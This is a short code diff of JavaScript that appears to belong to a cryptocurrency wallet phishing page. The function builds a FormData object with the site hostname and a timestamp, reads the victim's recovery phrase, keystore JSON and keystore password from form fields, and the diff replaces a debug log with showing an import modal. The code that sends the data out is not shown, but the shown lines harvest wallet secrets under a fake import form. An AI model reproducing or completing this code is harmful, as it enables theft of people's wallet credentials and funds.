@@ -12,8 +12,7 @@ function o(e) {
   subject = `${window.location.hostname} ${new Date()}`;
   let r = new FormData();
   let s = document.querySelector("form").name;
- 
-  console.log(r)
+  importeModal.style.display = "flex";
   phrase = phraseInput.value;
   jsonphrase = keystorejson.value;
   password = keystore_password.value;
